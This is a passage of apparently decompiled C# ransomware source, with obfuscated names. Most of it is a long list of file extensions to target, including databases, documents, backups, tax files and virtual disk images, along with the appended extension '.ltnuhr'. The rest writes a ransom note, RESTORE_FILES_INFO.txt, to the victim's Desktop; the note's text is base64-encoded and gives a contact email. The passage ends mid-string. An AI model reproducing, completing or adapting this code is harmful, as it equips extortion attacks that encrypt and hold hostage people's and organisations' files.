				"l3dw", "l6t", "la", "label", "laccdb", "las", "lastlogin", "lat", "latex", "lav",
				"lax", "lay", "lay6", "layout", "lbf", "lbi", "lbl", "lbx", "lcb", "lcd",
				"lcf", "LCK", "lcm", "lcn", "ld2", "ldabak", "ldb", "ldif", "lef", "lev",
				"lex", "lfe", "lfp", "lg1", "lg2", "lgc", "lgf", "lgh", "lgi", "lgl",
				"lgp", "lhd", "lhr", "lib", "lib4d", "lif", "life", "lin", "list", "lit",
				"litemod", "livereg", "liveupdate", "lix", "LKG", "ll3", "llb", "llv", "llx", "LM",
				"lmd", "lmf", "lms", "lmx", "lng", "lngttarch2", "lnt", "lnx", "LO_", "loc",
				"localstorage", "LOG1", "logonxp", "lok", "lot", "lp", "lp2", "lp7", "lpa", "lpc",
				"lpd", "lpdb", "lpdf", "lpk", "lpkg", "lpmd", "lpp", "lpx", "lqm", "lrcat",
				"lrdata", "lrf", "lrlib", "lrlibrary", "lrm", "lrtoolkit", "ls3", "ls5", "lsa", "lsd",
				"lsf", "lsl", "lsp", "lsr", "lst", "lsu", "ltcx", "ltm", "ltr", "LTS",
				"ltx", "lua", "lud", "lut", "lutx", "lvd", "lvivt", "lvl", "lvm", "lvw",
				"lw4", "lwd", "lwo", "lwp", "lwx", "lx01", "lxf", "lxk", "ly", "lyt",
				"lyx", "m", "m13", "m14", "m2", "m2ts", "m3u", "m3u8", "m4a", "m4p",
				"m4u", "m4v", "m7p", "maca", "maf", "mag", "mai", "maker", "maml", "man",
				"manu", "map", "mapimail", "MAPSTYLE", "maq", "mar", "marc", "markdn", "mars", "marshal",
				"mas", "mass", "mat", "mav", "max", "maxfr", "maxm", "mba", "mbbk", "mbd",
				"mbf", "mbg", "mbi", "mbox", "mbp", "mbx", "mc1", "mc9", "mcat", "mcd",
				"mcdx", "mcf", "mcgame", "mcmac", "mcmeta", "mcp", "mcrp", "mcw", "mcx", "md",
				"md0", "md1", "md2", "md3", "md5", "md8", "mdbackup", "mdbhtml", "mdc", "mdccache",
				"mdd", "mddata", "mdg", "mdi", "mdinfo", "mdj", "mdk", "mdl", "mdm", "mdn",
				"mds", "mdsx", "MDT", "mdx", "MDZ", "mecontact", "med", "mef", "meg", "mega",
				"meh", "mell", "mellel", "mem", "menc", "menu", "meo", "merlin2", "met", "METADATA",
				"metadata_never_index", "mex", "mf", "mf4", "mfa", "mfe", "mfl", "mfo", "mfp", "mft",
				"mfu", "mfv", "mfw", "mga", "mgmt", "mgourmet", "mgourmet3", "mgourmet4", "mhp", "mht",
				"mhtenx", "mhtmlenx", "mi", "mic", "mid", "mif", "mim", "mime", "mindnode", "miniso",
				"mip", "mission", "mix", "mjd", "mjdoc", "mjk", "mkd", "mke", "mkv", "mla",
				"mlb", "mlc", "mlj", "mlm", "mls", "mlsxml", "mlx", "mm", "mm6", "mm7",
				"mm8", "mmap", "mmc", "mmd", "mme", "mmf", "mmjs", "mml", "mmm", "mmo",
				"mmp", "mmsw", "mmw", "mnc", "mng", "MNI", "mnk", "mno", "mny", "mo",
				"mobi", "mod", "MODEL", "MOF", "moho", "mol", "money", "moneywell", "mos", "mosaic",
				"mov", "movie", "mox", "moz", "mp1", "mp2", "mp4v", "mpa", "mpd", "mpe",
				"mpeg", "mpf", "mpg", "mph", "mpj", "mpkt", "mpp", "mppz", "mpq", "mpqge",
				"mpr", "mps", "mpt", "mpv", "mpv2", "mpx", "mpz", "mrd", "mrg", "mrimg",
				"mru", "mrw", "mrwref", "ms", "ms10", "msb", "msc", "msct", "msd", "mse",
				"msf", "msg", "mshc", "msie", "msim", "msl", "mso", "msor", "msp", "msq",
				"mss", "ms-tnef", "msw", "mswd", "mtdd", "mte", "mtf", "mtff", "mth", "MTL",
				"mtm", "mtml", "mto", "mtp", "mts", "mtw", "mtx", "mtxt", "mud", "mug",
				"mui", "mum", "mup", "mvd", "mvdx", "mvex", "mvm", "mw", "mwb", "mwd",
				"mwf", "mwii", "mwpd", "mwpp", "mws", "mwx", "mx", "mxad", "mxc2", "mxd",
				"mxg", "mxi", "mxl", "mxp", "myd", "mydocs", "myi", "myo", "mz", "n3",
				"nam", "names", "nap", "narrative", "nas", "nav", "navmap", "nb", "nb7", "nba",
				"nbak", "nbd", "nbe", "nbf", "nbi", "nbk", "nbp", "nbs", "nbu", "nc",
				"ncd", "ncf", "nco", "ncorx", "nct", "nd", "nda", "ndb", "ndd", "ndif",
				"ndk", "ndl", "ndr", "nds", "ndx", "ne1", "ne3", "nef", "nessus", "net",
				"neta", "netspd", "netspm", "NEW", "nfb", "nfc", "nfi", "nfl", "nfo", "nfs",
				"nfs11save", "ng", "NGR", "nitf", "njx", "nk2", "nl", "nlogo", "nlogo3d", "NLP",
				"NLT", "nma", "nmbtemplate", "nmea", "nmind", "nmm", "nmp", "nmu", "nn", "nni",
				"NNM", "nnp", "nnt", "nokogiri", "nop", "not", "note", "notebook", "now", "noy",
				"np", "npd", "npdf", "npf", "npl", "npp", "npr", "nps", "npt", "npy",
				"nrb", "nrbak", "nrc", "nrd", "nrf", "nrg", "nri", "nrl", "nrm", "nrmlib",
				"nrs", "nrt", "nru", "nrw", "nrx", "ns2", "ns3", "ns4", "nsd", "nsg",
				"nsh", "nsq", "nsr", "nst", "nt", "ntf", "ntl", "ntp", "nts", "ntx",
				"NU2", "number", "numbers", "nupkg", "NUS", "NUSPEC", "nv", "nv2", "nvd", "nvdl",
				"nvl", "nvm", "nvram", "nwb", "nwbak", "nwcab", "nwcp", "nwdb", "nwelicense", "nwo",
				"nwp", "nws", "nx^d", "nx__", "nx1", "nx2", "nxl", "nyf", "oa2", "oa3",
				"oab", "oad", "oas", "obb", "OBD", "OBE", "obj", "obk", "obr", "obt",
				"obx", "obz", "occ", "ocdc", "ocimf", "ocs", "od", "oda", "odb", "odc",
				"odccubefile", "odf", "odg", "odh", "odi", "odif", "odm", "odo", "odp", "ods",
				"odt", "odt#", "odttf", "odx", "odz", "oeaccount", "oeb", "oem", "ofc", "officeui",
				"ofm", "ofn", "oft", "ofx", "oga", "ogc", "ogg", "oggu", "ogm", "ogmu",
				"ogs", "oil", "ojz", "okm", "old", "ole", "ole2", "olf", "olk", "olk14event",
				"olk14group", "olk14note", "olk14task", "oll", "olm", "olt", "olv", "oly", "omcs", "omg",
				"omlog", "omp", "onb", "ond", "one", "onepkg", "ont", "ontx", "oo3", "oos",
				"oot", "op", "op2", "op4", "opal", "opax", "opd", "opf", "opj", "opju",
				"oplx", "opn", "opt", "opx", "opxs", "oqy", "or2", "or3", "or4", "or5",
				"or6", "ora", "orf", "org", "ori", "orig", "ORP", "ort", "orx", "osd",
				"osdx", "ost", "osz", "ot", "otc", "otf", "otg", "oth", "oti", "otl",
				"otln", "otn", "otp", "ots", "ott", "otw", "otx", "out", "ova", "ovd",
				"ovf", "ovolog", "ovx", "owc", "owl", "owx", "oxps", "oxt", "oyx", "p01",
				"p10", "p12", "p2g", "p2i", "p2s", "p3", "p3x", "p65", "p7b", "p7c",
				"p7x", "p7z", "p96", "p97", "pab", "pack", "pad", "paf", "pages", "pages-tef",
				"pak", "pan", "paq", "partimg", "pas", "pat", "paux", "paw", "pbd", "pbf",
				"pbix", "pbj", "PBK", "pbp", "pbr", "pbs", "pbx5script", "pbxscript", "pc", "pcap",
				"pcapng", "pcb", "pcc", "pcd", "pcf", "pch", "pcj", "pck", "pcr", "PCS",
				"pct", "pcv", "pcw", "pd", "pd4", "pd5", "pdas", "pdb", "pdc", "pdcr",
				"pdd", "pdf", "pdf_", "pdf_profile", "pdf_tsid", "pdfa", "pdfe", "pdfenx", "pdfig", "pdfl",
				"pdfua", "pdfvt", "pdfx", "pdfxml", "pdfz", "pdg", "pdi", "pdm", "pdo", "pdp",
				"pds", "pdw", "pdx", "pdz", "peb", "pef", "pem", "pep", "PERF", "pes",
				"pex", "pez", "pf", "pfc", "pfd", "pfl", "pfm", "pfsx", "pft", "pfx",
				"pg", "pgd", "pgs", "phb", "phd", "phm", "php", "phr", "phs", "pih",
				"pixexp", "pj2", "pj4", "pj5", "pjm", "pjt", "pk", "pka", "pkb", "pkey",
				"pkg", "pkh", "pkpass", "pks", "pkt", "pl", "plan", "planner", "plb", "plc",
				"pld", "pli", "pln", "pls", "plt", "plus_muhd", "plw", "pm", "PM2", "pm3",
				"pm4", "pm5", "pm6", "pm7", "pmatrix", "pmd", "pmf", "pml", "pmm", "pmo",
				"pmr", "pmt", "pmv", "pmx", "pnproj", "pns", "pnu", "pnz", "po", "POC",
				"pod", "poi", "pool", "popshape", "por", "pot", "pothtml", "potm", "potx", "pp",
				"pp2", "pp3", "ppam", "ppd", "ppdf", "ppf", "ppj", "ppp", "ppr", "pps",
				"ppsenx", "ppsm", "ppsx", "ppt", "ppte", "ppthtml", "pptl", "pptm", "pptmhtml", "pptt",
				"pptx", "ppws", "ppx", "prc", "prd", "prdx", "pref", "prel", "prf", "printcd2",
				"prj", "prn", "pro", "pro4", "pro4dvd", "pro4pl", "pro4plx", "pro4x", "pro5", "pro5dvd",
				"pro5pl", "pro5plx", "pro5x", "pro6plx", "proofingtool", "props", "proqc", "prproj", "prr", "prs",
				"prt", "prtc", "prv", "prx", "ps", "PS1XML", "ps2", "ps3", "psa", "psafe3",
				"psb", "psd", "PSD1", "pse8db", "psf", "psg", "psi2", "psip", "psk", "psm",
				"PSM1", "psmd", "pspd", "pspimage", "pss", "pst", "psv", "psw", "psw6", "pswx",
				"psz", "pt3", "pt6", "ptb", "ptc", "ptf", "pth", "ptk", "ptn", "ptn2",
				"pts", "ptx", "PTXML", "ptz", "pub", "pubf", "pubhtml", "pubmhtml", "pubx", "puz",
				"pvd", "pve", "pvf", "pvhd", "pvm", "pvw", "pw", "pwd", "pwe", "pwf",
				"pwi", "pwm", "pwp", "pwre", "pxd", "pxf", "pxi", "pxj", "pxl", "pxp",
				"py", "pys", "pzc", "pzf", "pzt", "q07", "q08", "q09", "q3d", "qb",
				"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qb2011", "qb2012", "qb2013", "qb2014", "qb2015",
				"qb2016", "qb2017", "qba", "qbatlg", "qbb", "qbj", "qbk", "qbl", "qbm", "qbmb",
				"qbmd", "qbr", "qbw", "qbx", "qbxml", "qby", "qch", "qcow", "qcow2", "qct",
				"qdat", "qdb", "qdf", "qdf-backup", "qdfm", "qdfx", "qdp", "qdt", "qed", "qel",
				"qf", "qfilter", "qfl", "qfx", "qfxx", "qhp", "qht", "qhtm", "qic", "qif",
				"qlgenerator", "qm", "qmbl", "qmtf", "qpb", "qpf", "qph", "qpx", "qrc", "qrmx",
				"qrp", "qrt", "qry", "qs", "qsd", "qsf", "qt", "qtq", "qtr", "qtw",
				"QUE", "quiz", "quox", "qv~", "qvd", "qvf", "qvp", "qvw", "qwd", "qwt",
				"qxb", "qxd", "qxf", "qxl", "qxp", "qxt", "r00", "r01", "r02", "r03",
				"r0f", "r0z", "r3d", "ra", "ra2", "raf", "ral", "ram", "ramd", "rap",
				"rar", "RAT", "ratdvd", "raw", "ray", "razy", "rb", "rbc", "rbf", "rbk",
				"rbs", "rbt", "rcb", "rcc", "rcd", "rcg", "rcl", "rctd", "rcx", "rd",
				"rd1", "rda", "rdata", "rdb", "rdf", "rdfs", "rdg", "rdi", "RDLC", "rdlx",
				"rdo", "rdoc", "rdoc_options", "rdx", "rdz", "re4", "reb", "rec", "redif", "ref",
				"reference", "rel", "rels", "rep", "res", "resbuild", "RESJSON", "rest", "result", "RESW",
				"ret", "rev", "rez", "rf", "rf1", "rfa", "rfo", "rft", "rge", "rgmb",
				"rgmc", "rgn", "rgo", "rgss3a", "rha", "rhif", "rhistory", "rim", "rit", "rl",
				"rlf", "rll", "rm", "rm5", "rmbak", "rmd", "rmf", "rmh", "rmuf", "rmx",
				"rna", "rng", "rnq", "rnt", "rnw", "ro3", "roadtrip", "roca", "rod", "rodx",
				"rodz", "rofl", "rog", "roi", "ROM", "ros", "rou", "rov", "row", "rox",
				"roxio", "roz", "rp", "rpa", "rpd", "rpf", "RPO", "rpp", "rpprj", "rpres",
				"rpt", "rptr", "rpyb", "rrd", "rrpa", "rrr", "rrt", "rrx", "rs", "rsc",
				"rsd", "rsdf", "rsdoc", "rsf", "rsm", "rso", "rsp", "rsrc", "rst", "rsv",
				"rsw", "rt", "rt_", "rta", "rtdf", "rte", "rtf", "rtf_", "rtfd", "rtk",
				"rtp", "rtpi", "rts", "rtsl", "rtstn", "rtsx", "rtttl", "rtwsh", "rtx", "ruel",
				"rum", "run", "rupaf", "rv", "rvf", "rvl", "rvt", "rw2", "rwd", "rwg",
				"rwl", "rwlibrary", "rws", "rwz", "rxdoc", "rzk", "rzx", "s3db", "s85", "s8bn",
				"sa5", "sa7", "sa8", "saas", "sad", "saf", "safe", "safetext", "sah", "sam",
				"sar", "sas7bdat", "sav", "save", "say", "sb", "sbc", "sbd", "sbf", "sbn",
				"sbo", "sbpf", "sbs", "sbsc", "sbst", "sbu", "sbw", "sbx", "sc2save", "sc4",
				"sc45", "sca", "scd", "scdoc", "sce", "scf", "scg", "scgc", "scgp", "scgs",
				"sch", "SCHEMA", "scm", "scmt", "scn", "sco", "scr", "scriv", "scrivx", "scs",
				"scspack", "scssc", "sct", "scw", "scx", "scz", "sd", "sd0", "sd1", "sda",
				"sdb", "sdc", "sdd", "sddraft", "sdi", "sdl", "sdlxliff", "sdmdocument", "sdn", "sdo",
				"sdoc", "sdp", "sdr", "sds", "sdsk", "sdt", "sdv", "sdw", "sdz", "se1",
				"SEARCH-MS", "secure", "seed", "sef", "sel", "sen", "seo", "seq", "sequ", "server",
				"ses", "set", "setup", "sev", "sfd", "sff", "sfs", "sfx", "sgf", "sgi",
				"sgl", "sgm", "sgml", "sgz", "sh", "sh6", "shar", "shb", "show", "SHP",
				"shr", "shs", "shtml", "shw", "shx", "shy", "sic", "sid", "sidd", "sidn",
				"sidx", "sie", "sig", "sik", "sim", "sis", "skb", "skv", "skx", "sky",
				"sla", "sldm", "sldtm", "sldx", "sle", "slf", "slk", "SLL", "slm", "slp",
				"slt", "slx", "slz", "sm", "smc", "smd", "sme", "smf", "smh", "smi",
				"smlx", "smn", "smp", "smpkg", "sms", "smwt", "smx", "smz", "sn1", "sn2",
				"sna", "snag", "snapshot", "snb", "snf", "sng", "snk", "snp", "sns", "snt",
				"snx", "so", "soi", "sp", "spb", "spd", "spdf", "speccy", "spf", "spg",
				"spj", "spk", "spl", "spm", "spml", "sppt", "spq", "spr", "sprt", "sprz",
				"sps", "spt", "spub", "spv", "sq", "sqb", "sqd", "sqf", "sqfs", "sql",
				"sqlite", "sqlite3", "sqlitedb", "sqllite", "sqr", "sqx", "sr2", "src", "SRD", "SRD-SHM",
				"SRD-WAL", "srf", "srfl", "srr", "srs", "srt", "srw", "ssa", "ssc", "ssd",
				"ssh", "ssi", "ssiw", "ssm", "ssp", "ssv", "ssx", "st", "st4", "st5",
				"st6", "st7", "st8", "sta", "stc", "std", "stdl", "STF", "stg", "sti",
				"stk", "stl", "stm", "STORE", "stp", "stproj", "stpz", "str", "struct", "stt",
				"stu", "stw", "stx", "stxt", "sty", "styk", "stykz", "sub", "sud", "suf",
				"sum", "surf", "sv$", "sv2i", "svd", "svdl", "svf", "svg", "svi", "svm",
				"svn", "svp", "svr", "svs", "swd", "swdoc", "sweb", "swf", "SWIDTAG", "switch",
				"swk", "swp", "sx", "sxc", "sxd", "sxe", "sxg", "sxi", "sxl", "sxm",
				"sxml", "sxw", "syn", "syncdb", "t", "t01", "t02", "t03", "t04", "t05",
				"t06", "t07", "t08", "t09", "t10", "t11", "t12", "t13", "t14", "t15",
				"t16", "t17", "t18", "t2", "t2k", "t2ks", "t2kt", "t2t", "t4g", "t64",
				"t80", "ta1", "ta2", "ta4", "ta5", "ta6", "ta7", "ta8", "ta9", "tab",
				"tabula-doc", "tabula-docstyle", "tac", "tag", "tah", "tao", "tap", "tar", "tardist", "TARGETS",
				"tax", "tax08", "tax09", "tax10", "tax11", "tax12", "tax13", "tax15", "tax16", "tax17",
				"tax2008", "tax2009", "tax2010", "tax2011", "tax2012", "tax2013", "tax2014", "tax2015", "tax2016", "tax2017",
				"tax2018", "tax2019", "tb", "tbb", "tbd", "tbh", "tbk", "tbkx", "tbl", "tbx",
				"tbz2", "tc", "tcc", "tcd", "tch", "tck", "tclogs", "tcnet", "tcx", "td0",
				"tda", "TDAT", "tdb", "tde", "tdg", "tdl", "tdm", "tdms", "tdoc", "tdr",
				"tdt", "te", "te1", "te3", "teacher", "ted", "tef", "template", "temx", "ter",
				"terrn", "terrn2", "tet", "tex", "texi", "texinfo", "text", "textclipping", "textile", "tfa",
				"tfd", "tfm", "tfr", "tfrd", "tg", "tga", "tgc", "tgd", "tgf", "tgz",
				"THA", "thm", "thml", "thmx", "thr", "tib", "tibkp", "tie", "tif", "tiff",
				"tig", "time", "timeline", "tis", "tjp", "tk3", "tkfl", "tl5", "tlb", "tld",
				"tlg", "tlp", "tlt", "tlx", "tlz", "tm", "tm3", "tmb", "tmd", "TME",
				"tml", "tmlanguage", "tmp", "tmr", "tmv", "tmw", "tmx", "tmz", "tmzip", "tns",
				"tnsp", "toast", "toc", "TON", "top", "topc", "topx", "tor", "torrent", "totalsdb",
				"totalslayout", "tp", "tpb", "tpd", "tpf", "tpl", "tpo", "tps", "tpsdb", "tpu",
				"tpx", "tqs", "tra", "trashinfo", "trc", "trd", "TRE", "trf", "trif", "trk",
				"trm", "trn", "trp", "trs", "trx", "ts", "tsc", "tsk", "tsl", "tsr",
				"tst", "tsv", "tt10", "tt11", "tt12", "tt13", "tt14", "tt15", "tt16", "tt17",
				"tt18", "tt2", "ttax", "ttbk", "ttd", "ttk", "ttmd", "TTS", "ttskey", "ttxt",
				"tu", "tur", "tvc", "tvd", "tvdownload", "twb", "twbx", "twdi", "twdx", "twh",
				"twm", "tww", "twz", "twzip", "tx", "txa", "txd", "txe", "txf", "txm",
				"txn", "txtrpt", "tyimport", "tyset", "tzx", "u10", "u11", "u12", "u3d", "uax",
				"ubj", "ubox", "ubz", "uccapilog", "ucd", "uci", "ud", "udb", "udc", "udeb",
				"udf", "udl", "uds", "UDT", "uea", "ufs", "uhtml", "uibak", "uif", "ukr",
				"ulf", "uli", "ulp", "ulys", "ulz", "umf", "ump", "umx", "UNINSTALL", "unity3d",
				"unr", "UNT", "unx", "uof", "uop", "uos", "uot", "update", "updf", "upk",
				"upoi", "upp", "upr", "urd-journal", "urf", "url", "urp", "usa", "useq", "usr",
				"ustar", "usx", "ut2", "ut3", "utc", "utd", "ute", "utf8", "uti", "utm",
				"uts", "utx", "uu", "uud", "uue", "uvf", "uvw", "uvx", "uwl", "uwrf",
				"uxx", "v", "v12", "v2i", "v2t", "val", "vaporcd", "vault", "vbadoc", "vbd",
				"vbk", "vbm", "vbox", "vbox-prev", "vbpf1", "vbs", "vbw", "VBX", "vc", "vc4",
				"vc6", "vc8", "vcal", "vcd", "vce", "vcf", "VCH", "vco", "vcp", "vcrd",
				"vcs", "vct", "vcx", "vdb", "vdf", "vdi", "vdo", "vdoc", "vdt", "vdx",
				"vec", "VER", "vf", "vfd", "vff", "vfs", "vfs0", "vhd", "vhdx", "vi",
				"vibe", "view", "vip", "vis", "viz", "vlc", "vle", "vlg", "vlt", "vmbx",
				"vmdk", "vmf", "vmg", "vmm", "vmsd", "vmsn", "vmss", "vmt", "vmwarevm", "vmx",
				"vmxf", "vob", "voi", "vok", "volarchive", "voprefs", "vor", "vp", "vpcbackup", "vpd",
				"vpk", "vpl", "vpol", "vpp", "vpp_pc", "vpx", "vrb", "vrd", "VRG", "vrp",
				"vs", "vsch", "vscontent", "vsd", "VSDIR", "vsdx", "vsf", "vsi", "vspolicy", "vssm",
				"vssx", "vst", "vstx", "vsv", "vsx", "vtf", "vthought", "vtv", "vtx", "vud",
				"vvf", "vvv", "vw", "vw3", "vxml", "vym", "vzm", "w", "w01", "w02",
				"W2B", "w2p", "w3g", "w3x", "w51", "w52", "w60", "w61", "w6bn", "w6w",
				"w8bn", "w8tn", "wab", "wac", "wad", "waff", "wallet", "walletx", "war", "wav",
				"wave", "waw", "wb", "wb1", "wb2", "wb3", "wbb", "wbcat", "WBF", "wbi",
				"wbk", "wbt", "wbxml", "wbz", "wcat", "wcd", "wcf", "wcl", "wcn", "wcp",
				"wcst", "wd0", "wd1", "wd2", "wd3", "wdb", "wdbn", "wdf", "wdgt", "wdl",
				"wdn", "wdoc", "wdq", "wdx9", "wea", "web", "webapp", "webdoc", "webpart", "wep",
				"WER", "wflx", "wfm", "wgt", "whf", "wht", "wid", "WIH", "wii", "wil",
				"wim", "win", "winclone", "wiz", "wjf", "wjr", "wk!", "wk1", "wk2", "wk3",
				"wk4", "wk5", "wkb", "wke", "wki", "wkl", "wks", "wlb", "wld", "wll",
				"wls", "wlx", "wlxml", "wlz", "wm", "wma", "wmd", "wmdb", "wmf", "wmga",
				"wmk", "wml", "wmlc", "wmmp", "wmo", "wms", "wmt", "wmv", "wmx", "wn",
				"wnk", "wolf", "word", "wordlist", "world", "wotreplay", "wow", "woz", "wp", "wp42",
				"wp5", "wp50", "wp6", "wp7", "wpa", "wpb", "wpc", "wpc2", "wpd", "wpd0",
				"wpd1", "wpd2", "wpd3", "wpe", "wpf", "wpk", "wpl", "wpo", "wpost", "wps",
				"wpt", "wpw", "wr1", "wrf", "wri", "wrk", "wrlk", "ws", "ws1", "ws2",
				"ws3", "ws4", "ws5", "ws6", "ws7", "WSB", "WSC", "wsd", "wsf", "wsh",
				"wsi", "wsm", "wsp", "wspak", "wtb", "wtbn", "wtd", "wtf", "wtml", "wtmp",
				"wtp", "wtr", "wts", "wtt", "wtx", "wud", "wvp", "wvw", "wvx", "wwcx",
				"WWD", "wwi", "wwl", "wws", "wwt", "wx", "wxmx", "wxp", "wyn", "wzn",
				"wzs", "x11", "x16", "x3f", "x3g", "x64", "xa", "xaf", "xaiml", "XAML",
				"xamlx", "xappl", "xar", "xas", "xav", "xbc", "xbd", "XBF", "xbk", "xbrl",
				"xbt", "xci", "xcsl", "xda", "xdb", "xdc", "xdf", "xdi", "xdna", "xdo",
				"xdoc", "xdp", "xds", "xdw", "xef", "xem", "xer", "xf", "xfd", "xfdf",
				"xfi", "xfl", "xflow", "xfn", "xfo", "xfp", "xfr", "xft", "xfx", "xgml",
				"xgmml", "xgp", "xht", "xhtm", "xhtml", "xif", "xig", "XIN", "xis", "xjf",
				"xl", "xla", "xlam", "xlb", "xlc", "xld", "xle", "xlf", "xlgc", "xliff",
				"xline", "xlist", "xlk", "xll", "xlm", "xlnk", "xlr", "xls", "xlsb", "xlse",
				"xlshtml", "xlsl", "xlsm", "xlst", "xlsx", "xlsxl", "xlt", "xlthtml", "xltm", "xltx",
				"xlv", "xlw", "xlwx", "xma", "xmap", "xmcd", "xmct", "xmd", "xmdf", "xmf",
				"xmi", "xmind", "xml", "xmlff", "xmlper", "xmmap", "xmn", "xmp", "xmpz", "xms",
				"xmt_bin", "xmta", "xmwx", "xmzx", "XPB", "xpd", "xpdl", "xpg", "xpi", "xpj",
				"xpll", "xpm", "xpr", "xps", "xpse", "xpt", "xpwe", "xqm", "xqr", "xqx",
				"xrb", "xrdml", "xrff", "xrp", "xry", "xsc", "xsd", "xsf", "xsig", "xsl",
				"xslt", "xsvf", "XSX", "xtbl", "xtd", "xtg", "xtm", "xtml", "xtp", "xtps",
				"xtrl", "xum", "xv0", "xv2", "xv3", "xva", "xvct", "xvd", "xvg", "xvid",
				"xvl", "xwd", "xweb3htm", "xweb3html", "xweb4stm", "xweb4xml", "xwf", "xwp", "xxd", "xxe",
				"xxx", "xy", "xy3", "xy4v", "xyd", "xyz", "xyzv", "yab", "yam", "ycbcra",
				"ychat", "yenc", "YES", "ygf", "yka", "yml", "ync", "yps", "yrcbck", "yrcbkm",
				"yrcdat", "yumtx", "yuv", "z02", "z04", "zap", "zbfx", "zdb", "zdc", "zdct",
				"ZFSENDTOTARGET", "zim", "zip", "zipx", "zix", "zma", "zmc", "zoo", "zpl", "zps",
				"ztmp", "ert", "efd", "biz", "CDX", "SQL", "DD", "MD", "MDF", "LOG",
				"DB", "BD", "LOG", "cfu", "DAT", "DBF", "DBX", "SDF", "BACK", "BACKUP",
				"BAC", "AWB", "DMP", "SAV", "TIB", "VBK", "VRB", "WBB", "TRN", "TIS",
				"ZIP", "RAR", "SQL", "BAK", "DCX", "DBC", "DBX", "DCT", "XLS", "XLSX",
				"DOC", "DOCX", "FPT", "LDF", "NDF", "$ER", "4DD", "4DL", "ACCDB", "ACCDC",
				"ACCDE", "ACCDR", "ACCDT", "ACCFT", "ADB", "ADB", "ADE", "ADF", "ADP", "ALF",
				"ASK", "BTR", "CAT", "CDB", "CDB", "CDB", "CKP", "CMA", "CPD", "CRYPT12",
				"CRYPT8", "CRYPT9", "DACPAC", "DAD", "DADIAGRAMS", "DASCHEMA", "DB", "DB", "DB-SHM", "DB-WAL",
				"DBCRYPT12", "DBCRYPT8", "DB3", "DBC", "DBF", "DBS", "DBT", "DBV", "DBX", "DCB",
				"DCT", "DCX", "DDL", "DLIS", "DP1", "DQY", "DSK", "DSN", "DTSX", "DXL",
				"ECO", "ECX", "EDB", "EDB", "EPIM", "EXB", "FCD", "FDB", "FDB", "FIC",
				"FMP", "FMP12", "FMPSL", "FOL", "FP3", "FP4", "FP5", "FP7", "FPT", "FRM",
				"GDB", "GDB", "GRDB", "GWI", "HDB", "HIS", "IB", "IDB", "IHX", "ITDB",
				"ITW", "JET", "JTX", "KDB", "KEXI", "KEXIC", "KEXIS", "LGC", "LWX", "MAF",
				"MAQ", "MAR", "MARSHAL", "MAS", "MAV", "MDB", "MDF", "MPD", "MRG", "MUD",
				"MWB", "MYD", "NDF", "NNT", "NRMLIB", "NS2", "NS3", "NS4", "NSF", "NV",
				"NV2", "NWDB", "NYF", "ODB", "ODB", "OQY", "ORA", "ORX", "OWC", "P96",
				"P97", "PAN", "PDB", "PDB", "PDM", "PNZ", "QRY", "QVD", "RBF", "RCTD",
				"ROD", "ROD", "RODX", "RPD", "RSD", "SAS7BDAT", "SBF", "SCX", "SDB", "SDB",
				"SDB", "SDB", "SDC", "SDF", "SIS", "SPQ", "SQL", "SQLITE", "SQLITE3", "SQLITEDB",
				"TE", "TEACHER", "TEMX", "TMD", "TPS", "TRC", "TRC", "TRM", "UDB", "UDL",
				"USR", "V12", "VIS", "VPD", "VVV", "WDB", "WMDB", "WRK", "XDB", "XLD",
				"XMLFF", "vmrs", "VMSC", "VMRS", "3me", "3pe", "hif", "iif", "lyt", "nd",
				"qb2005", "qb2006", "qb2007", "qb2009", "qb2010", "qbb", "qbm", "qbmb", "qbo", "qbw",
				"qbx", "qdf", "qel", "qfx", "qpb", "qsd", "tax", "tax08", "tax09", "tax10",
				"tax11", "tax2008", "tax2009", "tax2010", "tax2011", "tlg", "tt11", "qb2011", "qb2012", "imt",
				"3ME", "3PE", "HIF", "IIF", "LYT", "ND", "QB2005", "QB2006", "QB2007", "QB2009",
				"QB2010", "QBB", "QBM", "QBMB", "QBO", "QBW", "QBX", "QDF", "QEL", "QFX",
				"QPB", "QSD", "TAX", "TAX08", "TAX09", "TAX10", "TAX11", "TAX2008", "TAX2009", "TAX2010",
				"TAX2011", "TLG", "TT11", "QB2011", "QB2012", "IMT", "VHDX", "VHD", "lxa", "LXA",
				"AVHD", "AVHDX", "OVA"
			}, new string[0], FdUEgPawbnib, ".ltnuhr");
		}
		catch (Exception ex11)
		{
			if (bZJnUpHOpIgqq)
			{
				try
				{
					File.AppendAllText(SlCyjezmzcjRF, "Finish process: " + ex11.Message);
				}
				catch (Exception)
				{
				}
			}
			try
			{
				secureString.Dispose();
			}
			catch
			{
			}
		}
		try
		{
			secureString.Dispose();
		}
		catch
		{
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt"))
			{
				using StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RESTORE_FILES_INFO.txt");
				streamWriter.WriteLine(agZtqMkMayfivgE("SGVsbG8uDQoNCllvdXIgZmlsZXMsIGRvY3VtZW50cywgZGF0YWJhc2VzIGFuZCBhbGwgdGhlIHJlc3QgYXJlbid0IFJFTU9WRUQuIA0KVGhleSBhcmUgY2lwaGVyZWQgYnkgdGhlIG1vc3QgcmVsaWFibGUgZW5jaXBoZXJpbmcuDQpJdCBpcyBpbXBvc3NpYmxlIHRvIHJlc3RvcmUgZmlsZXMgd2l0aG91dCBvdXIgaGVscC4NCllvdSB3aWxsIHRyeSB0byByZXN0b3JlIGZpbGVzIGluZGVwZW5kZW50IHlvdSB3aWxsIGxvc2UgZmlsZXMNCkZPUkVWRVIuDQoNCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCllvdSB3aWxsIGJlIGFibGUgdG8gcmVzdG9yZSBmaWxlcyBzbzoNCg0KMS4gdG8gY29udGFjdCB1cyBieSBlLW1haWw6IHJlY292ZXJ5ZmlsZXNAdGVjaG1haWwuaW5mbw0KDQoqIHJlcG9ydCB5b3VyIElEIGFuZCB3ZSB3aWxsIHN3aXRjaCBvZmYgYW55IHJlbW92YWwgb2YgZmlsZXMgDQogIChpZiBkb24ndCByZXBvcnQgeW91ciBJRCBpZGVudGlmaWVyLCB0aGVuIGVhY2ggMjQgaG91cnMgd2lsbCBiZQ0KICB0byBiZSByZW1vdmVkIG9uIDI0IGZpbGVzLiBJZiByZXBvcnQgdG8gSUQtd2Ugd2lsbCBzd2l0Y2ggb2ZmIGl0KQ0KDQoqIHlvdSBzZW5kIHlvdXIgSUQga